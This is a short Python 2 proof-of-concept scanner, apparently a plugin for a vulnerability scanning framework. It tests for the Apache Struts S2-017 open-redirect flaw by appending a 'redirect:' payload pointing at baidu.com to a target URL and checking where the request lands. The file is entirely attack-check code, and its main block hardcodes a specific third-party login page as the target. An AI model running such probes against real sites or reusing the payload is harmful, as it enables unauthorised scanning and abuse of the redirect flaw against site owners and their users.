#coding=utf-8
import sys
import requests
from lib.core.data import logger


readme = {
    "url": "target url"
}


def scan(target):
    poc = '?redirect:https://www.baidu.com/'

    headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }

    try:
        audit_request = requests.get(target + poc, headers=headers)
        audit_request.close()
        if audit_request.status_code == 200:
            if audit_request.url == u'https://www.baidu.com/':
                logger.success("Success! %s is vulnerable S2-017." % target)
                return True
            else:
                logger.warning("%s is not vulnerable S2-017." % target)
                return False
        else:
            logger.warning("%s is not vulnerable S2-017." % target)
    except Exception, e:
        logger.warning("Failed to connection target, %s" % e)
        return False


def poc(target):
    return scan(target)


def run(arg):
    url = arg["url"]
    scan(url)


if __name__ == '__main__':
    poc("http://ycjy.scezju.com/jjxt/yhLogin.action")
    run({"url": "http://ycjy.scezju.com/jjxt/yhLogin.action"})
